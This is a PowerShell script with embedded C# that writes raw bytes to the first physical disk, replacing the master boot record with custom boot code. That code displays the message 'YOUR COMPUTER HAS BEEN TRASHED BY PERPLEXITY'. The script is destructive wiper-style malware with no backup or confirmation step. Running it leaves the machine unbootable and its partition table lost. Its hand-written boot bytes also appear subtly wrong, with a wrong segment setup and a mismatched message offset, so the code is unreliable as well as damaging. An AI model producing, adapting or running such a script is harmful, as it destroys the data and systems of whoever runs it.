powershell Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
using System.IO;

public class RawDiskAccess {
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern SafeFileHandle CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool ReadFile(
        SafeFileHandle hFile,
        byte[] lpBuffer,
        uint nNumberOfBytesToRead,
        out uint lpNumberOfBytesRead,
        IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteFile(
        SafeFileHandle hFile,
        byte[] lpBuffer,
        uint nNumberOfBytesToWrite,
        out uint lpNumberOfBytesWritten,
        IntPtr lpOverlapped);

    public const uint GENERIC_READ = 0x80000000;
    public const uint GENERIC_WRITE = 0x40000000;
    public const uint OPEN_EXISTING = 3;
    public const uint FILE_SHARE_READ = 0x00000001;
    public const uint FILE_SHARE_WRITE = 0x00000002;

    public static void WriteMBR(byte[] data) {
        if (data.Length != 512)
            throw new ArgumentException("Data must be exactly 512 bytes");

        SafeFileHandle handle = CreateFile(
            @"\\.\PhysicalDrive0",
            GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            IntPtr.Zero,
            OPEN_EXISTING,
            0,
            IntPtr.Zero);

        if (handle.IsInvalid) {
            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
        }

        if (!WriteFile(handle, data, 512, out uint bytesWritten, IntPtr.Zero) || bytesWritten != 512) {
            handle.Close();
            throw new IOException("Failed to write MBR sector");
        }

        handle.Close();
    }
}
"@

# ----------- USER CUSTOMIZATION -----------

# Change this string to whatever you want displayed on boot.
# Keep it short (recommended max ~30 characters).
$customMessage = "YOUR COMPUTER HAS BEEN TRASHED BY PERPLEXITY"

# --------------------------------------------

# Base MBR boot code bytes (from the assembly example)
$mbrHeader = @(
    0xB8,0x0E,0x00,      # mov ax, 0x000E (set AH=0x0E BIOS teletype function)
    0x8E,0xD8,           # mov ds, ax
    0xBE,0x1F,0x7C,      # mov si, 0x7C1F (offset of message)
    0xB4,0x0E,           # mov ah, 0x0E
    0xAC,                # lodsb
    0x3C,0x00,           # cmp al, 0
    0x74,0x0A,           # je done
    0xCD,0x10,           # int 0x10
    0xEB,0xF5,           # jmp lodsb (loop)
    0xF4                 # hlt (halt)
)

# Convert custom message to ASCII bytes + null terminator
$msgBytes = [System.Text.Encoding]::ASCII.GetBytes($customMessage) + 0

# Calculate padding length: total 510 bytes minus header and message length
$paddingLength = 510 - $mbrHeader.Length - $msgBytes.Length

if ($paddingLength -lt 0) {
    Write-Error "Message too long! Reduce the length (max ~30 chars)."
    exit
}

# Build the full MBR binary
$mbrBinary = $mbrHeader + $msgBytes + @(0x00) * $paddingLength + @(0x55, 0xAA) # Boot signature

Write-Output "Writing custom MBR with message: '$customMessage' ..."
try {
    [RawDiskAccess]::WriteMBR($mbrBinary)
    Write-Output "Custom MBR written successfully."
} catch {
    Write-Error "Failed to write custom MBR: $_"
}
